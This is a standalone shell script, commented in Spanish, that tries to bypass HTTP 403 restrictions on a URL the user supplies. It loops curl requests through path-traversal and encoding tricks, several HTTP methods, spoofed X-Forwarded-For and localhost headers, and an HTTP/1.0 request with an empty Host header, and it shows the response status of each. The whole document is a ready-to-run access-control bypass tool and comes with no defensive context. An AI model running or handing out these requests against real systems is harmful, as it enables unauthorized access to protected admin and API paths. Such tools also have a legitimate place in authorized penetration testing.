#!/bin/sh
# 403-bypass6.sh
# Muestra la petición curl completa
# Compatible Bash Shell 1.0.x
# Uso:
#   ./403-bypass6.sh https://target.com/ruta/protegida
#   ./403-bypass6.sh https://target.com/admin/

if [ $# -ne 1 ]; then
    echo "Uso: $0 <URL>"
    echo "Ejemplos:"
    echo "  $0 https://ejemplo.com/admin/"
    echo "  $0 https://target.com/api/v1/private"
    exit 1
fi

FULL_URL="$1"

echo ""
echo "============================================================="
echo " Pruebas 403 bypass → $FULL_URL"
echo
echo "============================================================="
echo ""

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"

# ────────────────────────────────────────────────
#  Pequeña función para ejecutar y filtrar solo 200
# ────────────────────────────────────────────────
run_curl() {
    cmd="$1"
    echo "$cmd"
    echo "--------------------------------------------------"

    # Ejecutamos y capturamos la primera línea de la respuesta
    output=$(eval "$cmd" 2>/dev/null | head -n 1)

    echo "$output"

    # Buscamos 200 en la primera línea
    case "$output" in
        *" 200 "*)
            echo ""
            ;;
        *)
            # No mostramos nada más (silencioso para los no-200)
            ;;
    esac
    echo ""
}

echo "[*] Variaciones de path + métodos"
echo ""

for extra in \
    "" \
    "/" \
    "//" \
    "/." \
    "/.." \
    "/../" \
    "/%2e/" \
    "/%2e%2e/" \
    "/.;/" \
    "/..;/" \
    "%20" \
    "%09" \
    "?" \
    "%3f" \
    "%23" \
    "/*" \
    "/.random" \
; do
    test_url="${FULL_URL}${extra}"

    for method in GET HEAD OPTIONS POST PUT ACL; do
        cmd="curl -sk -m 7 -I -X $method -H \"User-Agent: $UA\" \"$test_url\""
        run_curl "$cmd"
    done
done

echo "[*] Cabeceras de proxy/localhost spoofing"
echo ""

for h in \
    "X-Forwarded-For: 127.0.0.1" \
    "X-Forwarded-For: localhost" \
    "X-Forwarded-For: ::1" \
    "X-Real-IP: 127.0.0.1" \
    "X-Remote-Addr: 127.0.0.1" \
    "Client-IP: 127.0.0.1" \
    "X-Forwarded-Host: localhost" \
    "Forwarded: for=127.0.0.1;proto=https;by=localhost" \
; do
    for extra in "" "//" "/." "/..;/" "/.;/"; do
        test_url="${FULL_URL}${extra}"
        cmd="curl -sk -m 7 -I -X GET -H \"$h\" -H \"User-Agent: $UA\" \"$test_url\""
        run_curl "$cmd"
    done
done

echo "[*] Trucos HTTP/1.0 + Host header"
echo ""

cmd="curl -sk -m 7 -I -H \"User-Agent: $UA\" \"$FULL_URL\""
run_curl "$cmd"

cmd="curl -sk -m 7 -I --http1.0 -H \"Host:\" -H \"User-Agent: $UA\" \"$FULL_URL\""
run_curl "$cmd"


